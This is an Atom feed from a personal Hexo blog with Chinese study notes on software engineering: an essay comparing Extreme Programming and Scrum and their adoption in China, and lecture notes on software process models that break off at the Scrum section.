<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>(ﾟ∀。)</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-21T08:16:34.378Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>LUY</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>软件工程之敏捷方法综述:XP与Scrum</title>
    <link href="http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0-XP%E4%B8%8EScrum/"/>
    <id>http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0-XP%E4%B8%8EScrum/</id>
    <published>2020-08-21T08:13:58.000Z</published>
    <updated>2020-08-21T08:16:34.378Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍了敏捷方法中的极限编程与Scrum，就二者的相似与区别、各自在实践中的优劣势进行了论述分析。并根据相关资料整理得出其在国内应用的现状，进一步分析其背后的原因，并加以展望未来的发展可能性。</p><p>关键词：敏捷开发，极限编程，Scrum，系统开发方法，软件工程</p><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li>极限编程与 Scrum方法概述<ol><li>什么是极限编程<ol><li>极限编程的简述</li><li>极限编程的目的</li><li>极限编程的12条军规</li><li>极限编程的4个价值</li></ol></li><li>什么是Scrum？<ol><li>Scrum的简述与流程</li><li>Scrum中的三大角色</li></ol></li></ol></li><li>二者的比较分析<ol><li>Xp与scrum的主要异同</li><li>二者的区别<ol><li>迭代长度的不同</li><li>是否允许修改需求</li><li>User Story是否严格按照优先级别来实现</li><li>是否采用严格的工程方法保证进度或者质量</li></ol></li><li>Xp与 Scrum在生产实践中的优劣</li></ol></li><li>国内应用现状</li><li>小结</li></ol><hr><h2 id="一、极限编程与Scrum方法概述"><a href="#一、极限编程与Scrum方法概述" class="headerlink" title="一、极限编程与Scrum方法概述"></a>一、极限编程与Scrum方法概述</h2><h3 id="什么是极限编程（Extreme-Programming，XP）？"><a href="#什么是极限编程（Extreme-Programming，XP）？" class="headerlink" title="什么是极限编程（Extreme Programming，XP）？"></a>什么是极限编程（Extreme Programming，XP）？</h3><h4 id="极限编程的简述"><a href="#极限编程的简述" class="headerlink" title="极限编程的简述"></a>极限编程的简述</h4><p>极限编程是一种软件工程方法学，并且是敏捷软件开发中应用最为广泛和最富有成效的几种方法学之一。相对于传统的软件开发方法学，它更加强调字开发过程中软件需求的不断变化性，认为这种变化是及其正常且不可避免的。正因为如此，极限编程非常注重对于变化的适应，而不是对变化的规避或预测。</p><h4 id="极限编程的目的"><a href="#极限编程的目的" class="headerlink" title="极限编程的目的"></a>极限编程的目的</h4><p>极限编程的主要目标在于<strong>降低因需求变更而带来的成本</strong>。</p><p>在传统系统开发方法中，系统需求在开始阶段后在之后的开发过程中保持不变的。这意味着项目在进入后期阶段时出现的需求变更将导致开发成本急速增加。</p><p>极限编程通过引入基本价值、原则、方法等概念来达到降低变更成本的目的。一个应用了极限编程方法的系统开发项目在应对需求变更时将显得更为灵活。</p><h4 id="极限编程的12条军规"><a href="#极限编程的12条军规" class="headerlink" title="极限编程的12条军规"></a>极限编程的12条军规</h4><p>短交付周期    计划游戏    结对编程    可持续的节奏    </p><p>代码集体所有    编码规范    简单设计    测试驱动开发    </p><p>重构    系统隐喻    持续集成    现场客户</p><h4 id="极限编程的4个价值"><a href="#极限编程的4个价值" class="headerlink" title="极限编程的4个价值"></a>极限编程的4个价值</h4><h5 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h5><p>是在开发小组的成员之间迅速构建与传播制度上的认识的一种方法。极限编程支持设计、抽象、还有用户-程序员间交流的简单化，鼓励经常性的口头交流与回馈。</p><h5 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h5><p>鼓励从最简单的解决方式入手，再通过不断重构达到更好的结果。它只关注于对当前的需求来进行设计、编码。为了将来不确定的需求进行设计以及编码意味着在不必要的方面浪费资源。</p><p>而且设计与代码上的简化可以提高交流的质量。</p><h5 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h5><p>XP团队重视反馈，反馈越快越好。</p><ol><li>来自系统的反馈：通过编写单元测试，程序员能够很直观的得到经过修改后系统的状态。</li><li>来自客户的反馈：功能性测试是由客户还有测试人员来编写的。他们能由此得知当前系统的状态。</li><li>来自小组的反馈：当客户带着新需求来参加项目计划会议时，小组可以直接对于实现新需求所需要的时间进行评估然后反馈给客户。</li></ol><h5 id="勇气"><a href="#勇气" class="headerlink" title="勇气"></a>勇气</h5><p>勇气是软件开发中的一个重要价值，因为它需要勇气来坦率真诚地面对客户，它需要勇气来识别我们自己，我们的团队和我们的组织的缺点，并努力改善这些缺点。</p><h3 id="什么是Scrum？"><a href="#什么是Scrum？" class="headerlink" title="什么是Scrum？"></a>什么是Scrum？</h3><h4 id="Scrum-的简述与流程"><a href="#Scrum-的简述与流程" class="headerlink" title="Scrum 的简述与流程"></a>Scrum 的简述与流程</h4><p>Scrum 是用于开发、交付和持续支持复杂产品的一个框架，是一个增量的、迭代的开发过程。</p><p>在这个框架中，整个开发过程由若干个短的迭代周期（Sprint）组成，每个Sprint的建议长度是一至四周。</p><p>在Scrum中，使用按照商业价值排序的需求列表（Backlog）来管理产品的需求。Scrum团队总是先开发对客户具有较高价值的需求。</p><p>在每一个Sprint计划会议上，将高优先级的需求经过讨论、分析得到相应的任务列表，称它为Sprint backlog。每个成员根据Sprint Backlog再细化成更小的任务。</p><p>在一次迭代环节中，需要进行 Daily Scrum Meeting（每日站立会议），每次会议控制在15分钟左右，每个人都必须汇报你昨天完成了什么、承诺你今天要完成什么，以及遇到不能解决的问题。最后要走到黑板前更新自己的 Sprint burn down（Sprint燃尽图）</p><p>在每个迭代结束时，Scrum团队将召开  Sprint Retrospective Meeting（回顾会议），总结并讨论改进的地方，放入下一轮Sprint的产品需求中；并递交潜在可交付的产品增量（Increment）</p><h4 id="Scrum中的三大角色"><a href="#Scrum中的三大角色" class="headerlink" title="Scrum中的三大角色"></a>Scrum中的三大角色</h4><h5 id="产品负责人（Product-Owner）"><a href="#产品负责人（Product-Owner）" class="headerlink" title="产品负责人（Product Owner）"></a>产品负责人（Product Owner）</h5><p>主要负责确定产品的功能和达到要求的标准，指定软件的发布日期和交付的内容，同时有权力接受或拒绝开发团队的工作成果。</p><h5 id="流程管理员（Scrum-Master）"><a href="#流程管理员（Scrum-Master）" class="headerlink" title="流程管理员（Scrum Master）"></a>流程管理员（Scrum Master）</h5><p>主要负责整个Scrum流程在项目中的顺利实施和进行，以及清除挡在客户和开发工作之间的沟通障碍，使得客户可以直接驱动开发。</p><h5 id="开发团队（Scrum-Team）"><a href="#开发团队（Scrum-Team）" class="headerlink" title="开发团队（Scrum Team）"></a>开发团队（Scrum Team）</h5><p>主要负责软件产品在Scrum规定流程下进行开发工作，人数控制在5~10人左右，每个成员可能负责不同的技术方面，但要求每成员必须要有很强的自我管理能力，同时具有一定的表达能力；成员可以采用任何工作方式，只要能达到Sprint的目标。</p><h2 id="二、二者的比较分析"><a href="#二、二者的比较分析" class="headerlink" title="二、二者的比较分析"></a>二、二者的比较分析</h2><h3 id="XP与Scrum的主要异同"><a href="#XP与Scrum的主要异同" class="headerlink" title="XP与Scrum的主要异同"></a>XP与Scrum的主要异同</h3><h4 id="二者的相同"><a href="#二者的相同" class="headerlink" title="二者的相同"></a>二者的相同</h4><p>同属于敏捷开发，都是为了在不确定或混乱的环境中取得项目的成功。</p><p>最终目的相同：都是为了迭代出更好的产品交付给用户。</p><h4 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h4><h5 id="迭代长度的不同"><a href="#迭代长度的不同" class="headerlink" title="迭代长度的不同"></a>迭代长度的不同</h5><p>XP的一个Sprint的迭代长度大致为1~2周, 而Scrum的迭代长度一般为 2~ 4周</p><h5 id="是否允许修改需求"><a href="#是否允许修改需求" class="headerlink" title="是否允许修改需求"></a>是否允许修改需求</h5><p>XP在一个迭代中，如果一个User Story还没有实现， 则可以考虑用另外的需求将其替换， 替换的原则是需求实现的时间量是相等的。</p><p> 而Scrum是不允许这样做的，一旦迭代开工会完毕, 任何需求都不允许添加进来。</p><h5 id="User-Story是否严格按照优先级别来实现"><a href="#User-Story是否严格按照优先级别来实现" class="headerlink" title="User Story是否严格按照优先级别来实现"></a>User Story是否严格按照优先级别来实现</h5><p>XP是务必要遵守优先级别的。 但Scrum在这点做得很灵活， 可以不按照优先级别来做。</p><h5 id="是否采用严格的工程方法保证进度或者质量"><a href="#是否采用严格的工程方法保证进度或者质量" class="headerlink" title="是否采用严格的工程方法保证进度或者质量"></a>是否采用严格的工程方法保证进度或者质量</h5><p>Scrum没有对软件的整个实施过程定义任何方法。要求开发者自觉保证产品的生产。</p><p>但XP对整个流程方法定义非常严格，规定需要采用TDD, 自动测试， 结对编程，简单设计，重构等约束团队的行为。</p><h3 id="XP与Scrum在生产实践中的优劣"><a href="#XP与Scrum在生产实践中的优劣" class="headerlink" title="XP与Scrum在生产实践中的优劣"></a>XP与Scrum在生产实践中的优劣</h3><p>Scrum的出现实践比极限开发更早。scrum被定义为一个“框架”，提供了宏观上的概念及方法论——鸡类人员、猪类人员、计划会议、每日站立会议、验收会议和回顾会议等等。但是没有提出对于细节的控制与要求（这在前面的区别也有论述），这导致了Scrum更多的是作为一种实践思想与范本，而不是生产过程中的标准。此外，这也导致了Scrum在实际运用中质量的良莠不齐。</p><p>极限开发的出现晚于Scrum ，其中也鲜明地带有或多或少的Scrum烙印。Xp是由“价值观”“原则”和“实践”组成，其中的理念（价值观与）是统筹Xp所有方法的核心。但是在实际的生产实践中，Xp大量的实践约束带来了相当大的成本。无论是人员成本较高的结对编程，还是技术门槛较高的TDD，都给Xp带来了实现的困难。这也导致了在生产实践中，Xp很少会作为一套“完整的流程”，而更多地作为生产中的建议而部分采纳。</p><p>当然，实践中更多地是采用两种多种不同的方法之长进行混合开发。</p><h2 id="三、国内应用现状"><a href="#三、国内应用现状" class="headerlink" title="三、国内应用现状"></a>三、国内应用现状</h2><p>Scrum作为从国外引进的系统开发的技术。在国内的实践并不顺利。酷壳站长陈皓曾经编译过一篇《为什么Scrum不行？》，其中提到了9个Scrum不行的理由。如下：</p><blockquote><p><strong>Reason 1:</strong> Scrum的基石是相信人。创造一个安全的环境，这样每个人都能相互学习，相互直言。但是，这是不行的，这世上有很多人并不关心这些，而且政治和竞争到处都是，办公室里无小事，你和别人交心，你相信他们，最终受伤的你自己。你真的以为那里有空间让你可以去犯错，去冒险吗？</p><p><strong>Reason 2:</strong> Scrum认为只要给员工足够多的自由员工就能做得最好。这该死的理论是基于什么玩意？不可能，人的天性是懒惰的，他们才不会把事做好的，他们只会做相应报酬的工作量，还可能基本甚至达不到其相应的报酬，大多数人都在混日子。尤其是和经理比起来，谁不想能尽快地成为经理或Team leader啊，因为那样他们就可以即不干活，又挣得多。另外，你给他们自由，你就会发现，他们会只会做他们感兴趣的事，要么聊QQ，要么打游戏，看闲书，反正不干正事。直到你催了，他们才动一动。</p><p><strong>Reason 3:</strong> 因为前面的原因，所以，我们仍然要把一个PM放在Scrum团队的上面做管理，这样才会有产出。于是，PM给团队分配任何，管得细枝末节，事无巨细，天天让你做进度汇报，等等。直至把团队拖垮。</p><p><strong>Reason 4:</strong>Scrum只不过是一个流程。这世上有太多的流程，尤其是那那些执行CMMI的公司。几乎所有玩CMMI流程的公司，你都能看到的是员工都是那一副副难看的脸。所以，Scrum的流程同样会这样。因为这些都不是开发团队自发出来的，而是上面管你喜欢不喜欢按给你的。Scrum根本不可能增进你的软件质量和技术，只能是优秀的人才才可能！使用Scrum的公司都是些吝啬鬼，他们不愿花大钱招优秀的人，他们妄图使用Scrum这种东西让现有的这些廉价劳动力发挥更大的生产效率，Scrum成了push程序员最有用的工具。</p><p><strong>Reason 5:</strong>Scrum delivers ‘business value’。不是这样的，实际上，Scrum不可能。这有很多原因。真正了解业务的那帮人根本不可能加入项目团队，那些人谁TMD愿意和苦逼的技术人员加班啊。 那些人喜欢和我们的用户吃吃喝喝，花天酒地的，根本不会和你们那些奇怪的东西（如：backlog）或是那堆ugly的内向古怪的技术人员打交道，更别说什么技术了。所以，你的团队就像一个客服团队或救火队一样疲于奔命。</p><p><strong>Reason 6:</strong> 一个敏捷的团队应该是持续进步的。这就是为什么Scrum总是在问什么干得好，什么需要改进，并定义行动方案。你真的以为员工想进步吗？让他们不得不去想想自己和团队怎么进步，然后他们还不得不去执行行动方案。别天真了，人的天性是不喜欢改变的，人的天性是习惯于一些按部就搬的事，也许那样做令人讨厌，但是人家还是能干点东西出来。如果你逼着人家改变，你就是在压迫人家，人家自然会反抗。</p><p><strong>Reason 7:</strong>Product Owner专注于 ‘what’ 和 ‘why’ 的问题，开发团队决定 ‘how’。很不错的分工，于是可以造就一个即高速有重质量的团队。然而，这根本不行。你的Product Owner马上就想要这个功能，他才不管你的软件开发的技术难题，人家只要快，要你meet deadline，要你给我们重要的客户做出承诺。另外，你千万不要以为你们可以轰走这个初级的product owner，因为他的后台是直接汇报到高层管理。你作为一个程序员可能只是其个小部门的一个小喽啰，或者只是外包公司，你觉得可能吗？你觉得建立信任可能吗？</p><p><strong>Reason 8:</strong> 软件质量和生产率成正比。也就是说，质量越高，生产率越高。如果质量不高，你开发效率就会低下，但是谁管呢？我们朝九晚五的上班，质量好了也是做8小时，质量差了也是做8小时，无所为嘛。另外，我们的project manager (或者是Scrum master!) 总是会批评我们没有按计划完成。所以，这根本不可能。</p><p><strong>Reason 9:</strong> “是的，如果我们只做需要的功能，那么我们就会最低的成本，对吗？”，为什么这世上总是会有这些幼稚的人？这种事怎么可能啊。很多很多的银行或保险公司的项目在你还没有启动项目前就谈好了一个价格（可能还会有回扣），为了打单子，销售什么都干得出来，让你去做项目是因为你是廉价劳动力，而且，他们会不断地加需求，因为软件合同谈好的价格时候，连需求都没有，你去做了才有，还是模糊和不确定或根本就是错的，然后需求是越来越多，越改越多。等你精疲力尽的时候，你才意识到，销售早就把你卖了。</p></blockquote><p>这九点抨击了<strong>Scrum方法体系中过度的理想化，构建了一个平等、高效、友善的类乌托邦式的开发团队</strong>。而作者指出这一理想环境是很难在现实中遇到的，无论是开发团队成员拒绝不断积极地改进重构；还是项目负责人只是追求开发结果；还是业务人员不愿与团队交流…这些都是在社会语境下会存在的实际问题。</p><p>我认为国内对于Scrum方法运用的屡屡碰壁也由此的一部分原因。姑且假设Scrum方法是高效的，但是在我国生产环境及行业背景下却很难将这一高效的特性发挥出来（甚至有可能更加低效）。我国的互联网行业普遍存在高级程序员稀缺、低级程序员泛滥的问题。对于某一出现的问题，可能大部分开发者不适沟通与解决。<strong>Scrum更加适合于一帮资深程序员组成的team，每个人都是牛人，每个人都有激情干活</strong>。在国内大家只是干活拿工资，没什么激情，不适合Scrum。</p><p>极限编程在实践落地中的现状与问题已经在前述优劣处提过，在于<strong>过于复杂的实践带来了更高的成本</strong>。结伴开发。每周40工时等一设想几乎不可能在国内互联网公司（尤其是各中小型公司）推广，更多的公司和PM选择借鉴其中的一部分作为项目开发的“建议”。而Xp中的 <strong>价值观 和原则 更是不被互联网公司重视</strong>，可能在互联网及迅速发展的大背景下，更多的公司热衷于能直接带来红利的狼性文化，而不是沟通、简答、反馈和勇气。</p><p>尽管如此，我们依旧发现<strong>国内的生产实践中存在不少实践成功的事例</strong>。早在2008年，在 google 的 Agile China 讨论组中出现了一系列的帖子讨论Scrum ，内容涉及对Scrum 的理解、CSM 的接受程度及其在国内的实施效果等方面。从这些讨论的字里行间不难看出，业内人员已对“敏捷”有了更深入的思考，而不再是最初的模仿。发展至今，也许以Xp和Scrum为代表的敏捷开发早已深入人心，但是其<strong>在具体实践中的细节仍然需要国内互联网从业者们根据国情进行不断的取舍、优化与迭代。</strong></p><h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><ol><li>极限编程和Scrum作为21世纪兴起的敏捷开发的代表性方法论，各具特性又互相影响。Scrum更多提供了框架供开发团队参考和自我完善。而极限编程作为一整个价值观、原则与实践，为开发的各项环节确定了可供使用的标准。</li><li>二者思想相近、内容相异，彼此在兴起与发展过程中互相融合补充。也在十数年的实践中体现了各自的优劣性与适用场景。</li><li>目前大多数公司采用以Scrum为框架，Xp中借鉴部分的实践方法进行开发。</li><li>国内目前对于二者的应用并不顺利，在引进这两种高效开发方法的同属遇到了很多我国特定的社会与技术问题有待解决。也许未来随着我国互联网产业的进一步成熟，会在此为框架基础上形成一套适合我国国情的中国特色敏捷开发方法体系。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>什么是敏捷    <a href="http://www.scrumcn.com/agile/scrum-knowledge-libray/agile101.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/scrum-knowledge-libray/agile101.html</a></li><li>什么是SCRUM    <a href="http://www.scrumcn.com/agile/xp.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/xp.html</a></li><li>什么是极限编程    <a href="http://www.scrumcn.com/agile/scrum-knowledge-library/scrum.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/scrum-knowledge-library/scrum.html</a></li><li>xp和scrum在实战中的应用问题    <a href="https://www.cnblogs.com/cly84920/archive/2012/12/26/4426470.html" target="_blank" rel="noopener">https://www.cnblogs.com/cly84920/archive/2012/12/26/4426470.html</a></li><li>敏捷方法之极限编程(XP)和 Scrum区别    <a href="https://www.cnblogs.com/dekevin/p/5613664.html" target="_blank" rel="noopener">https://www.cnblogs.com/dekevin/p/5613664.html</a>)</li><li>运用Scrum做项目管理真实案例    <a href="https://blog.csdn.net/lackin/article/details/7265992" target="_blank" rel="noopener">https://blog.csdn.net/lackin/article/details/7265992</a></li><li>Scrum 在中国——企业实施情况调查实录   <a href="https://www.infoq.cn/article/scrum_china_2008_investigate" target="_blank" rel="noopener">https://www.infoq.cn/article/scrum_china_2008_investigate</a></li><li>凤翼天翔——Scrum 在 Yahoo! 中的成功应用    <a href="https://www.infoq.cn/article/2008/03/Scrum-Adoption-in-Yahoo/" target="_blank" rel="noopener">https://www.infoq.cn/article/2008/03/Scrum-Adoption-in-Yahoo/</a></li><li>国人眼中的 Scrum    <a href="https://www.infoq.cn/article/2008/03/Scrum-Perspective-in-China" target="_blank" rel="noopener">https://www.infoq.cn/article/2008/03/Scrum-Perspective-in-China</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍了敏捷方法中的极限编程与Scrum，就二者的相似与区别、各自在实践中的优劣势进行了论述分析。并根据相关资料整理得出其在国内应用的现状，进一步分析其背后的原因，并加以展望未来的发展可能性。&lt;/p&gt;
&lt;p&gt;关键词：敏捷开发，极限编程，Scrum，系统开发方法，软件工程&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="软件工程概论" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="软件工程" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="敏捷开发" scheme="http://yoursite.com/tags/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>软件工程概论之过程模型</title>
    <link href="http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B/"/>
    <id>http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B/</id>
    <published>2020-08-21T08:07:53.000Z</published>
    <updated>2020-08-21T08:12:33.255Z</updated>
    
    <content type="html"><![CDATA[<ol><li>过程</li><li>软件过程模型<ol><li>瀑布模型    Waterfall model </li><li>V-模型  V model </li><li>原型模型 Prototyping model </li><li>阶段性开发：增量与迭代  Phased development:  increments and iteration </li><li>螺旋模型  Spiral model </li><li>敏捷开发 Agile methods</li></ol></li></ol><p><em>之前随便记的,千万别用来备考期末</em></p><a id="more"></a><h1 id="软件工程概论-第二章-过程模型与生命周期"><a href="#软件工程概论-第二章-过程模型与生命周期" class="headerlink" title="软件工程概论  第二章  过程模型与生命周期"></a>软件工程概论  第二章  过程模型与生命周期</h1><h2 id="2-1-过程-Meaning-of-Process"><a href="#2-1-过程-Meaning-of-Process" class="headerlink" title="2.1 过程     Meaning of  Process"></a>2.1 过程     Meaning of  Process</h2><p>软件开发不等于写课后题</p><ol><li>实际软件大而复杂</li><li>多人协作，需要及时沟通及对工程的共同理解</li></ol><h3 id="什么是过程？"><a href="#什么是过程？" class="headerlink" title="什么是过程？"></a>什么是过程？</h3><p> A process defines <strong>who</strong> is doing <strong>what, when</strong> and <strong>how</strong>, in order to reach a certain <strong>goal</strong>.</p><p>一组任务的集合。具体是包括：</p><ul><li>分工及workflow：谁去干什么？先干什么？后干什么？</li><li>产品：不止是最终交付的软件，还包括在过程中的某一环节生产出的各种文档、手册、代码etc</li><li>里程碑 Mailstones：如何标志一个环节结束？</li><li>。。。</li></ul><h3 id="使用过程的重要性"><a href="#使用过程的重要性" class="headerlink" title="使用过程的重要性"></a>使用过程的重要性</h3><ol><li>确保生产过程的一致性，以及对项目的整体结构的把握</li><li>指导如何理解项目、控制环节、检查成果。并改善上述活动</li><li>对同一类型（模型） 的生产过程积攒经验，并在下次处理同类问题时应用</li></ol><h3 id="综上，搭建过程模型的理由："><a href="#综上，搭建过程模型的理由：" class="headerlink" title="综上，搭建过程模型的理由："></a>综上，搭建过程模型的理由：</h3><ol><li>确保所有人对该项目有一个统一普遍的理解；</li><li>To find inconsistencies, redundancies, omissions （？？？）</li><li>确定合适的活动来实现其中每个阶段目标，并在时候对其进行评估；</li><li>对特定的、同类型的工程总结普遍的开发规律，并在日后开发时加以运用。</li></ol><h3 id="定义软件过程"><a href="#定义软件过程" class="headerlink" title="定义软件过程"></a>定义软件过程</h3><p>谁做什么，when，how，并且最终达到什么标准</p><p>生命周期是什么</p><p>图：软件开发中的多种阶段</p><h2 id="2-2-过程模型举例"><a href="#2-2-过程模型举例" class="headerlink" title="2.2 过程模型举例"></a>2.2 过程模型举例</h2><h3 id="2-2-1瀑布模型"><a href="#2-2-1瀑布模型" class="headerlink" title="2.2.1瀑布模型"></a>2.2.1瀑布模型</h3><p>严格地串行化过程。</p><ol><li>需求分析完全结束后，生成需求文档作为里程碑。</li><li>在需求文档基础上开始系统设计，生成功能分析表。</li><li>在功能分析表基础上开始程序设计，生成…….</li><li>…….编程</li><li>…….单元测试、集成测试</li><li>…….系统测试</li><li>…….验收测试 &amp; 交付</li><li>……维护与保养</li></ol><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583564856014.png" alt="瀑布模型"></p><h4 id="瀑布模型的特点"><a href="#瀑布模型的特点" class="headerlink" title="瀑布模型的特点"></a>瀑布模型的特点</h4><p>模型易于理解；后续环节完全基于上游环节；每一步严格地具有输入输出的产品/文档；对不同阶段的开发者定义为不同的角色。</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583637124830.png" alt="1583637124830"></p><h4 id="瀑布模型的问题"><a href="#瀑布模型的问题" class="headerlink" title="瀑布模型的问题"></a>瀑布模型的问题</h4><p>要求每一步都需要完全正确。该模型难以回溯至上层环节。</p><p>Where the waterfall model works fine?</p><ul><li>既定的程序和技术</li><li>不需要太多的需求变化</li><li>•组织良好、角色明确的项目</li><li>“可重复”项目</li><li>时间与资金预算充足的大型项目</li></ul><h3 id="2-2-2-原型模型-Prototyping"><a href="#2-2-2-原型模型-Prototyping" class="headerlink" title="2.2.2 原型模型 Prototyping"></a>2.2.2 原型模型 Prototyping</h3><p>迅速建造一个可以运行的软件原型 ，以便理解和澄清问题，使开发人员与用户达成共识，最终在确定的客户需求基础上开发客户满意的软件产品。在需求分析阶段对软件的需求进行初步而非完全的分析和定义，由用户提出修改和细节，最终再进行实现。<img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583637791886.png" alt="1583637791886"></p><h3 id="2-2-3-V-模型-V-mode"><a href="#2-2-3-V-模型-V-mode" class="headerlink" title="2.2.3 V-模型     V-mode"></a>2.2.3 V-模型     V-mode</h3><p>为了解决开发出的软件质量不高问题</p><p>核心：通过设置多次测试来保证软件的质量</p><p>单元测试、集成测试、系统测试、验收测试</p><p>每一步测试不通过时可以向上回溯。</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567021149.png" alt="1583567021149"></p><h3 id="2-2-4-阶段性开发-Phased-development"><a href="#2-2-4-阶段性开发-Phased-development" class="headerlink" title="2.2.4 阶段性开发    Phased development:"></a>2.2.4 阶段性开发    Phased development:</h3><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><p>将整体的任务分解成多个小阶段，从而将工作量化简、并减少错误。</p><h4 id="递增开发，increments"><a href="#递增开发，increments" class="headerlink" title="递增开发，increments"></a>递增开发，increments</h4><p>由某一子系统开始开发，在每次版本更新时逐渐新增功能。</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567710642.png" alt="1583567710642"></p><h4 id="迭代开发，-iterations"><a href="#迭代开发，-iterations" class="headerlink" title="迭代开发， iterations"></a>迭代开发， iterations</h4><p>由整个系统的测试版开始开发，每次更新完善其中的部分模块</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567758762.png" alt="1583567758762"></p><h4 id="阶段性开发的优点"><a href="#阶段性开发的优点" class="headerlink" title="阶段性开发的优点"></a>阶段性开发的优点</h4><ul><li>产品可以提前发布，即使功能缺失或不完善</li><li>可以为以前从未提供过的功能提前创建市场</li><li>频繁的发布可以让开发人员快速、全面地解决未预料到的问题</li><li>开发团队可以通过不同的发布专注于不同的专业领域</li></ul><h3 id="2-2-5-螺旋开发-Spiral-model"><a href="#2-2-5-螺旋开发-Spiral-model" class="headerlink" title="2.2.5 螺旋开发    Spiral model"></a>2.2.5 螺旋开发    Spiral model</h3><ul><li>引入风险控制</li><li>开发呈现出围绕以下四个维度的螺旋式开发<ol><li>计划</li><li>定义目标、备选方案及限制</li><li>评估备选方案以及风险</li><li>开发与测试</li></ol></li></ul><p>特点：将与代码相关的内容压缩，大部分内容在开发研究</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583568162769.png" alt="1583568162769"></p><h3 id="2-2-6-混合开发-Hybrid-process-models"><a href="#2-2-6-混合开发-Hybrid-process-models" class="headerlink" title="2.2.6 混合开发 Hybrid process models"></a>2.2.6 混合开发 Hybrid process models</h3><p>过程模型有其优劣点与适用场景，不能一概而论。</p><p>下图为不同年代使用的不同开发模型，可见历史上所出现的所有软件工程模型都没有消亡过。（包括最初的瀑布模型）所以断言某一种模型比另外一种好是不可取的。事实上在实际工程项目中，各模型常常混合使用。</p><p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583638636203.png" alt="1583638636203"></p><h3 id="2-2-7-敏捷开发-Agile-methods"><a href="#2-2-7-敏捷开发-Agile-methods" class="headerlink" title="2.2.7 敏捷开发 Agile methods"></a>2.2.7 敏捷开发 Agile methods</h3><p>2001年敏捷宣言 Agile manifesto</p><blockquote><ul><li>重视<strong>个人和交互</strong>，而不是过程和工具。</li></ul><p>value individuals and interactions over processes and tools</p><ul><li>更愿意花时间在<strong>生产工作软件</strong>上，而不是在生产全面的文档上</li></ul><p>invest time in producing working software rather than in producing comprehensive documentation</p><ul><li>专注于<strong>客户协作</strong>而不是合同谈判，从而使客户参与开发过程的关键方面</li></ul><p>focus on customer collaboration rather than contrast negotiation</p><ul><li>专注于<strong>响应变化</strong>而不是先制定计划然后再执行，因为无法事先预料所有情况</li></ul><p>concentrate on responding to change rather than on creating a plan and then following it</p></blockquote><p>敏捷开发包括多种方法体系，这里主要介绍两种：Extreme programming和S</p><h4 id="2-2-7-1-极限编程-Extreme-programming（简称XP）"><a href="#2-2-7-1-极限编程-Extreme-programming（简称XP）" class="headerlink" title="2.2.7.1 极限编程 Extreme programming（简称XP）"></a>2.2.7.1 极限编程 Extreme programming（简称XP）</h4><p>四大基本特征：</p><ol><li><p>Communication</p><p>所有成员要及时沟通。</p></li><li><p>Simplify</p><p>以用户要求为最高标准，不要画蛇添足；越复杂越易错。</p></li><li><p>Courage</p><p>承担责任。所有成员都有权修改任何代码（并承担所有责任）</p></li><li><p>Feedback</p><p>反馈。不断地与客户反馈，并保证反馈的问题被跟踪、完善、解决。</p></li></ol><h4 id="2-2-7-2-Scrum"><a 